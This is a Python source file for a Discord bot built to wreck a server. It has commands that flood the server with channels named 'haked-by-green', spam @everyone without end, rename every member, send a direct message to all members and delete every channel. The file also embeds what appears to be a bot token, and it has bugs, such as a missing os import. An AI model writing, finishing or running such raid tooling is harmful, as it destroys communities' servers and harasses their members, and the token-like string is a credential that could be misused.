import discord
from discord.ext.commands import bot
from discord.ext import commands
import asyncio
import time
from discord.utils import get

client = commands.Bot(command_prefix='-')

@client.event
async def on_ready():
    print("armed!")

@client.command(pass_context=True)
async def sc(ctx):
    for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
        await ctx.guild.create_text_channel(name='haked-by-green')

@client.command(pass_context=True)
async def rall(ctx, rename_to):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        await user.edit(nick=rename_to)
    print ("done")

@client.command(pass_context=True)
async def spam(ctx):
    time.sleep(1)
    for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
        channel = discord.utils.get(ctx.guild.text_channels, name='haked-by-green')
        await channel.send("@everyone")

@client.command(pass_context=True)
async def msgall(ctx, *, message):
    await ctx.message.delete()
    for user in ctx.guild.members:
        await user.send(message)
        print("{user.name} has recieved the message.")
    print("Action Completed: mall")
    
@client.command(pass_context=True)
async def dchannel(ctx):
        for channel in list(ctx.guild.channels):
            await channel.delete()
            print ("done")

client.run(str(os.environ.get('NTczMjU2NDk3MDk0NDU5Mzkz.XMoMvw.iP8jlo0OkJA-opPQDLw2hVzVWnc')))
